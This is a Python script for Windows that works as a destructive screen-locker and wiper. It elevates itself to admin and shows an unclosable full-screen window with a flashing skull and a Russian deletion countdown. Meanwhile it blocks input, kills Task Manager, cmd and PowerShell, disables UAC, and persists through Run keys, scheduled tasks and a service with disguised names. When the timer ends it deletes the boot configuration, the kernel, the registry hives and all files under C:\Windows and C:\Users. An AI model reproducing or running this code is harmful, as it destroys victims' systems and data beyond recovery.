import tkinter as tk
import ctypes
import sys
import os
import time
import threading
import random

def block_shutdown():
    while True:
        os.system("shutdown /a 2>nul")
        os.system("taskkill /f /im cmd.exe 2>nul")
        os.system("taskkill /f /im powershell.exe 2>nul")
        os.system("taskkill /f /im taskmgr.exe 2>nul")
        os.system("taskkill /f /im regedit.exe 2>nul")
        time.sleep(0.1)

def block_keys():
    try:
        ctypes.windll.user32.BlockInput(True)
    except:
        pass

def infect_boot():
    os.system('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v "EnableLUA" /t REG_DWORD /d 0 /f 2>nul')
    os.system('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d 0 /f 2>nul')
    
    os.system(f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SystemService" /t REG_SZ /d "{sys.executable} \\"{__file__}\\"" /f 2>nul')
    os.system(f'reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SystemService" /t REG_SZ /d "{sys.executable} \\"{__file__}\\"" /f 2>nul')
    os.system(f'schtasks /create /tn "WindowsUpdate" /tr "{sys.executable} \\"{__file__}\\"" /sc onlogon /f /rl highest 2>nul')
    os.system(f'schtasks /create /tn "WindowsService" /tr "{sys.executable} \\"{__file__}\\"" /sc onstart /f /rl highest 2>nul')
    os.system(f'sc create "WindowsManager" binPath= "{sys.executable} \\"{__file__}\\"" start= auto 2>nul')
    os.system(f'sc start "WindowsManager" 2>nul')

def nuke():
    os.system("takeown /f C:\\ /r /d y 2>nul")
    os.system("icacls C:\\ /grant Everyone:F /t /q 2>nul")
    os.system("attrib -r -s -h C:\\*.* /s /d 2>nul")
    os.system("bcdedit /delete {current} /f 2>nul")
    os.system("del /f /q C:\\Windows\\System32\\ntoskrnl.exe 2>nul")
    os.system("del /f /q C:\\Windows\\System32\\config\\* 2>nul")
    os.system("del /f /s /q C:\\Windows\\*.* 2>nul")
    os.system("del /f /s /q C:\\Users\\*.* 2>nul")
    os.system("shutdown /r /t 0 /f 2>nul")

def flash_bg(root):
    colors = ["red", "green", "blue", "yellow", "purple", "orange", "cyan", "magenta", "white", "black"]
    while True:
        try:
            color = random.choice(colors)
            root.configure(bg=color)
            time.sleep(0.05)
        except:
            break

def locker():
    root = tk.Tk()
    root.title("")
    root.attributes('-fullscreen', True)
    root.attributes('-topmost', True)
    root.configure(bg='black')
    root.protocol("WM_DELETE_WINDOW", lambda: None)
    
    root.bind("<Alt-F4>", lambda e: "break")
    root.bind("<Escape>", lambda e: "break")
    root.bind("<Control-w>", lambda e: "break")
    
    def keep_focus():
        while True:
            try:
                root.focus_force()
                root.lift()
                time.sleep(0.1)
            except:
                break
    
    threading.Thread(target=keep_focus, daemon=True).start()
    threading.Thread(target=flash_bg, args=(root,), daemon=True).start()
    
    skull = """⣿⠲⠤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣸⡏⠀⠀⠀⠉⠳⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⠀⠀⠀⠀⠀⠀⠀⠉⠲⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢰⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠲⣄⠀⠀⠀⡰⠋⢙⣿⣦⡀
⠸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣙⣦⣮⣤⡀⣸⣿⣿⣿⠀
⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⠀⣿⢟⣫⠟⠀
⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣷⣷⣿⡁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⢸⣿⣿⣧⣿⣿⣆⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢾⣿⣤⣿⣿⣿⡟⠹⣿⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣧⣴⣿⢧
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⢻⣿⣿⣿⣿⣿⣿⣿⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡏⣸⣿⣿⣿⣿⣿⣿⣿⢳
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⢀⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠸⣿⣿⣿⣿⣿⣿⣿⣿⠏
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⣿⣿⣿⣿⣿⣿⣿⣿⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡇⢠⣿⣿⣿⣿⣿⣿⣿⣿"""
    
    tk.Label(root, text=skull, font=("Courier New", 10, "bold"), fg="white", bg="black").pack(expand=True, pady=10)
    tk.Label(root, text="Артем Трейдов core =D", font=("Arial", 35, "bold"), fg="red", bg="black").pack(pady=5)
    tk.Label(root, text="vk.com/patch делает", font=("Arial", 25), fg="white", bg="black").pack(pady=5)
    
    timer_label = tk.Label(root, text="Удаление через 60 секунд...", font=("Arial", 20), fg="red", bg="black")
    timer_label.pack(pady=10)
    
    threading.Thread(target=infect_boot, daemon=True).start()
    threading.Thread(target=block_shutdown, daemon=True).start()
    threading.Thread(target=block_keys, daemon=True).start()
    
    def update_timer():
        for i in range(60, 0, -1):
            timer_label.config(text=f"Удаление через {i} секунд...")
            time.sleep(1)
        
        timer_label.config(text="ВНИМАНИЕ! УДАЛЕНИЕ ДАННЫХ!", fg="yellow")
        time.sleep(1)
        
        for i in range(10, 0, -1):
            timer_label.config(text=f"УДАЛЕНИЕ через {i}...", fg="red")
            time.sleep(1)
        
        timer_label.config(text="УДАЛЕНИЕ!")
        nuke()
    
    threading.Thread(target=update_timer, daemon=True).start()
    root.mainloop()

if __name__ == "__main__":
    if not ctypes.windll.shell32.IsUserAnAdmin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
        sys.exit(0)
    locker()
